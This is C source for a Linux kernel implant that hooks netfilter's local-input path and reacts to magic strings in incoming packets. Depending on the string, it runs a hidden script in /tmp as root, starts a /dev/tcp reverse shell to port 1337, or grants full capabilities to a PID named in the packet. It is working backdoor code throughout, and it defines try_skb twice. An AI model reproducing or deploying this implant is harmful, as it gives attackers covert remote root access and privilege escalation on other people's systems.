#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>
#include <linux/kmod.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/capability.h>

// #define DEBUG_PAYLOAD

#ifdef DEBUG_PAYLOAD
#define Dprintk(fmt, ...) p_printk(KERN_DEBUG "Kris Implant: " fmt, ##__VA_ARGS__)
#else
#define Dprintk(fmt, ...) \
	do                    \
	{                     \
	} while (0)
#endif

#define MAGIC_RUN_SCRIPT "whats-a-jwt"
#define SCRIPT_LOCATION "/tmp/.jwt.sh"

#define MAGIC_REVSHELL "kris-probably-knows-what-a-jwt-is"
#define REVSHELL_CMD "sh -i >& /dev/tcp/127.0.0.1/1337 0>&1"

#define MAGIC_CAPABILITIES_PREFIX "its-pronounced-jot-according-to-RFC-"
#define MAGIC_CAPABILITIES_TERMINATOR '!'

// You can cat /proc/sys/kernel/cap_last_cap to get the last capability
// On my test machine, it was 40
// 2^41 - 1 = 2199023255551
// = 0x000001ffffffffffLL

#define DESIRED_CAPS 0x000001ffffffffffLL

extern unsigned char __payload[];
extern unsigned char __payload_end[];

//
extern long lookup_name(const char *);

////////////////////////////////////////////////////////////////////////////////
// Kernel API imports
////////////////////////////////////////////////////////////////////////////////

static typeof(_printk) *p_printk = NULL;
// static typeof(lookup_name) *p_lookup_name = NULL;
static typeof(kmalloc) *p_kmalloc = NULL;
static typeof(kfree) *p_kfree = NULL;
static typeof(memcmp) *p_memcmp = NULL;
static typeof(call_usermodehelper) *p_call_usermodehelper = NULL;
static typeof(nf_register_net_hooks) *p_nf_register_net_hooks = NULL;
static typeof(execute_in_process_context) *p_execute_in_process_context = NULL;
static typeof(get_pid_task) *p_get_pid_task = NULL;
static typeof(find_get_pid) *p_find_get_pid = NULL;

////////////////////////////////////////////////////////////////////////////////

static inline void *memmem(const void *h, size_t hlen, const void *n, size_t nlen)
{
	// This is a naive implementation of memmem
	if (!h || !hlen || !n || !nlen || (nlen > hlen))
		return NULL;

	while (hlen >= nlen)
	{
		if (!p_memcmp(h, n, nlen))
			return (void *)h;
		h++, hlen--;
	}

	return NULL;
}
/**
 * This function runs a shell script using usermodehelper. It sets the HOME environment variable to /proc
 * and executes the script located at SCRIPT_LOCATION using /bin/sh. It waits for the script to complete
 * execution before freeing the memory allocated for the execute_work struct.
 *
 * @param ws A pointer to the work_struct associated with the delayed work.
 */
static void delayed_work_run_script(struct work_struct *ws)
{
	char *envp[2] = {"HOME=/proc", NULL};
	char *argv[4] = {"/bin/sh", "-c", SCRIPT_LOCATION, NULL};
	p_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	p_kfree(container_of(ws, struct execute_work, work));
}
static void delayed_work_revshell(struct work_struct *ws)
{
	char *envp[2] = {"HOME=/proc", NULL};
	char *argv[4] = {"/bin/sh", "-c", REVSHELL_CMD, NULL};
	p_call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
	p_kfree(container_of(ws, struct execute_work, work));
}

static void print_capabilities(struct task_struct *taskp)
{
	Dprintk("taskp->real_cred->cap_inheritable: %llu\n", ((kernel_cap_t *)(&taskp->real_cred->cap_inheritable))->val);
	Dprintk("taskp->real_cred->cap_permitted: %llu\n", ((kernel_cap_t *)(&taskp->real_cred->cap_permitted))->val);
	Dprintk("taskp->real_cred->cap_effective: %llu\n", ((kernel_cap_t *)(&taskp->real_cred->cap_effective))->val);
	Dprintk("taskp->real_cred->cap_bset: %llu\n", ((kernel_cap_t *)(&taskp->real_cred->cap_bset))->val);
	Dprintk("taskp->real_cred->cap_ambient: %llu\n", ((kernel_cap_t *)(&taskp->real_cred->cap_ambient))->val);
	Dprintk("taskp->cred->cap_inheritable: %llu\n", ((kernel_cap_t *)(&taskp->cred->cap_inheritable))->val);
	Dprintk("taskp->cred->cap_permitted: %llu\n", ((kernel_cap_t *)(&taskp->cred->cap_permitted))->val);
	Dprintk("taskp->cred->cap_effective: %llu\n", ((kernel_cap_t *)(&taskp->cred->cap_effective))->val);
	Dprintk("taskp->cred->cap_bset: %llu\n", ((kernel_cap_t *)(&taskp->cred->cap_bset))->val);
	Dprintk("taskp->cred->cap_ambient: %llu\n", ((kernel_cap_t *)(&taskp->cred->cap_ambient))->val);
}

/**
 * Sets the capabilities of a given task to a desired value.
 * 
 * @param taskp Pointer to the task_struct of the task to modify.
 */
static void set_all_capabilities(struct task_struct *taskp)
{
	// set the capabilities
	// In kernel > 6.3, we use val instead of cap[0]

	// print initial capabilities
	print_capabilities(taskp);

	((kernel_cap_t *)(&taskp->real_cred->cap_inheritable))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_permitted))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_effective))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_bset))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->real_cred->cap_ambient))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_inheritable))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_permitted))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_effective))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_bset))->val = DESIRED_CAPS;
	((kernel_cap_t *)(&taskp->cred->cap_ambient))->val = DESIRED_CAPS;

	// print new capabilities
	Dprintk("new capabilities:\n");
	print_capabilities(taskp);
}

/**
 * This function tries to match the magic prefix in the given sk_buff data with the predefined magic prefixes.
 * If a match is found, it executes the corresponding function in the process context.
 * If the magic prefix for capabilities is found, it grants all capabilities to the process specified in the packet.
 * 
 * @param skb The sk_buff data to be matched with the magic prefixes.
 */
static void try_skb(struct sk_buff *skb)
{
	// function code here
}
static void try_skb(struct sk_buff *skb)
{
	/**
	 * This function checks if the skb data contains the magic prefix for run script.
	 * If the prefix is found, it creates a new execute_work struct and schedules it to run in process context.
	 * @param skb The socket buffer to check for the magic prefix.
	 */
	if (memmem(skb->data, skb_headlen(skb), MAGIC_RUN_SCRIPT, sizeof(MAGIC_RUN_SCRIPT) - 1))
	{
		Dprintk("found magic prefix for run script\n");
		struct execute_work *ws = p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
		if (ws)
		{
			p_execute_in_process_context(delayed_work_run_script, ws);
		}
		return;
	}
	if (memmem(skb->data, skb_headlen(skb), MAGIC_REVSHELL, sizeof(MAGIC_REVSHELL) - 1))
	{
		Dprintk("found magic prefix for revshell\n");
		struct execute_work *ws = p_kmalloc(sizeof(struct execute_work), GFP_ATOMIC);
		if (ws)
		{
			p_execute_in_process_context(delayed_work_revshell, ws);
		}
		return;
	}

	/*
	Grant all capabilities to the process specified in the packet.
	packet format is:
		<magic prefix><pid>
	*/
	// Check if the packet contains the magic prefix
	// if it does, get the pid
	char *p = memmem(skb->data, skb_headlen(skb), MAGIC_CAPABILITIES_PREFIX, sizeof(MAGIC_CAPABILITIES_PREFIX) - 1);
	if (p)
	{
		Dprintk("found magic prefix for capabilities\n");
		// get the pid
		unsigned long pid = 0;
		p += sizeof(MAGIC_CAPABILITIES_PREFIX) - 1;
		Dprintk("p: %p\n", p);
		while (*p >= '0' && *p <= '9')
		{
			pid *= 10;
			pid += *p - '0';
			p++;
		}
		Dprintk("pid: %lu\n", pid);

		// get the task struct taskp = get_pid_task(find_get_pid(PID),PIDTYPE_PID);
		struct task_struct *taskp = p_get_pid_task(p_find_get_pid(pid), PIDTYPE_PID);
		Dprintk("taskp: %p\n", taskp);

		// set the capabilities
		set_all_capabilities(taskp);
		Dprintk("capabilities set\n");
	}
}

/**
 * This function is a custom implementation of the local_in hook for Netfilter.
 * It receives a pointer to a socket buffer (skb) and attempts to process it using the try_skb function.
 * If the skb pointer is NULL, the function returns NF_ACCEPT.
 * @param arg A pointer to the argument passed to the hook.
 * @param skb A pointer to the socket buffer to be processed.
 * @param state A pointer to the current state of the hook.
 * @return An integer representing the Netfilter verdict for the skb.
 */
static unsigned int custom_local_in(void *arg, struct sk_buff *skb, const struct nf_hook_state *state)
{
	if (skb)
		try_skb(skb);
	return NF_ACCEPT;
}
/**
 * @brief This code defines an array of nf_hook_ops structures with a single element.
 * The element has a NULL hook function, NFPROTO_IPV4 protocol family, 
 * NF_INET_LOCAL_IN hook number, and NF_IP_PRI_FIRST priority.
 */
static struct nf_hook_ops nf_ops[] = {
	[0] = {
		.hook = (nf_hookfn *)NULL,
		.pf = NFPROTO_IPV4,
		.hooknum = NF_INET_LOCAL_IN,
		.priority = NF_IP_PRI_FIRST,
	},
};

static void init_nf_hooks(void *net)
{
	nf_ops[0].hook = (void *)custom_local_in;
	p_nf_register_net_hooks(net, nf_ops, ARRAY_SIZE(nf_ops));
}

long __attribute__((used, section(".text.entry"))) entry(const typeof(lookup_name) *lookup, void *net)
{

	p_printk = (void *)lookup("_printk");
	if (!p_printk)
		return -2;

	p_call_usermodehelper = (void *)lookup("call_usermodehelper");
	if (!p_call_usermodehelper)
	{
		Dprintk("no call_usermodehelper found\n");
		return -3;
	}

	p_kmalloc = (void *)lookup("__kmalloc");
	if (!p_kmalloc)
	{
		Dprintk("no __kmalloc found\n");
		return -4;
	}

	p_kfree = (void *)lookup("kfree");
	if (!p_kfree)
	{
		Dprintk("no kfree found\n");
		return -5;
	}

	p_memcmp = (void *)lookup("memcmp");
	if (!p_memcmp)
	{
		Dprintk("no memcmp found\n");
		return -6;
	}

	p_execute_in_process_context = (void *)lookup("execute_in_process_context");
	if (!p_execute_in_process_context)
	{
		Dprintk("no execute_in_process_context found\n");
		return -7;
	}

	p_nf_register_net_hooks = (void *)lookup("nf_register_net_hooks");
	if (!p_nf_register_net_hooks)
	{
		Dprintk("no nf_register_net_hooks found\n");
		return -8;
	}

	p_get_pid_task = (void *)lookup("get_pid_task");
	if (!p_get_pid_task)
	{
		Dprintk("no get_pid_task found\n");
		return -9;
	}

	p_find_get_pid = (void *)lookup("find_get_pid");
	if (!p_find_get_pid)
	{
		Dprintk("no find_get_pid found\n");
		return -10;
	}

	init_nf_hooks(net);

	Dprintk("Hook inserted!\n");

	return 0;
}
